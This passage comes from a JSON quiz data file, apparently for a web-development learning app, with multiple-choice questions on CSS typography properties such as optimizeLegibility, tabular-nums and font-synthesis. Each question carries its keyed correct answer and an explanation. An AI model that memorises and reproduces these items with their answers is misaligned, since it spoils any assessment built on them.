        "correctAnswer": "Switches text rasterization from subpixel antialiasing to grayscale antialiasing, rendering text slightly thinner and crisper on dark backgrounds",
        "explanation": "`antialiased` turns off subpixel rendering in favor of grayscale antialiasing, preventing bloated/fuzzy text on dark backgrounds."
      },
      {
        "question": "What potential performance issue can occur when setting `text-rendering: optimizeLegibility;` on long body articles?",
        "options": [
          "It removes punctuation marks",
          "It disables text selection",
          "It crashes mobile Chrome",
          "It forces complex kerning pairs and ligature lookups for every letter pair, leading to noticeable layout calculation lag on large blocks of text"
        ],
        "correctAnswer": "It forces complex kerning pairs and ligature lookups for every letter pair, leading to noticeable layout calculation lag on large blocks of text",
        "explanation": "`optimizeLegibility` enables advanced OpenType ligatures and kerning, which adds layout overhead on lengthy pages."
      },
      {
        "question": "What does `font-variant-numeric: tabular-nums;` do in financial tables and countdown timers?",
        "codeSnippet": ".timer, .crypto-price {\n  font-variant-numeric: tabular-nums;\n}",
        "language": "css",
        "options": [
          "Aligns numbers to the bottom of the table",
          "Converts Arabic numerals into Roman numerals",
          "Rounds all numbers to two decimal places",
          "Sets all numeric digits to equal monospaced widths, preventing numbers from jittering and shifting horizontally as values increment"
        ],
        "correctAnswer": "Sets all numeric digits to equal monospaced widths, preventing numbers from jittering and shifting horizontally as values increment",
        "explanation": "`tabular-nums` forces numbers to share uniform widths, eliminating layout jitter in timers and ticker tables."
      },
      {
        "question": "What does `font-synthesis: none;` prevent the browser from doing if a bold or italic font face is missing?",
        "options": [
          "Replaces the font with Comic Sans",
          "Prevents custom fonts from downloading",
          "Disables text-to-speech synthesizers",
          "Prevents the browser from synthesizing faux (fake) bold by stroking or faux oblique by slanting the regular font, preserving typographical integrity"
        ],
        "correctAnswer": "Prevents the browser from synthesizing faux (fake) bold by stroking or faux oblique by slanting the regular font, preserving typographical integrity",
        "explanation": "`font-synthesis: none` stops browsers from generating artificial bold or slanted fonts, ensuring only true designed faces render."
      }
    ]
  }
];
